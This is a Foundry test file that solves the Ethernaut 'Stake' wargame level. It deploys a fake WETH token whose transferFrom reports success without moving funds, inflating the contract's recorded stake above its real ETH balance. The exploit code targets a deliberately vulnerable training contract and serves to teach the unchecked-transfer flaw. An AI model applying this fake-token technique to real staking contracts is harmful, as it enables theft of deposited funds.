// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Stake} from "../src/levels/Stake.sol";

/// Ethernaut #31 "Stake" → SC02 logic / accounting (no exact catalog entry; trusts an external token
/// without verifying a real transfer). `StakeWETH` credits `totalStaked` + `UserStake` and ignores
/// the `transferFrom` result, so a fake WETH lets you stake phantom value (inflating `totalStaked`
/// above the real ETH balance). Win: balance != 0 && totalStaked > balance && UserStake[player]==0 &&
/// Stakers[player].
contract FakeWETH {
    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true; // "succeeds" without moving anything
    }
}

contract StakeTest is Test {
    address player = makeAddr("player");

    receive() external payable {}

    function test_solve_stake() public {
        FakeWETH weth = new FakeWETH();
        Stake lvl = new Stake{value: 1 ether}(address(weth)); // balance = totalStaked = 1 ether

        // phantom WETH stake (by us) inflates totalStaked without any real ETH
        lvl.StakeWETH(10 ether);

        // player stakes a little ETH (sets Stakers[player]) then unstakes it (UserStake[player] -> 0)
        vm.deal(player, 1 ether);
        vm.startPrank(player);
        lvl.StakeETH{value: 0.002 ether}();
        lvl.Unstake(0.002 ether);
        vm.stopPrank();

        assertTrue(address(lvl).balance != 0, "balance non-zero");
        assertGt(lvl.totalStaked(), address(lvl).balance, "totalStaked exceeds real balance");
        assertEq(lvl.UserStake(player), 0, "player has no recorded stake");
        assertTrue(lvl.Stakers(player), "player is a staker");
    }
}
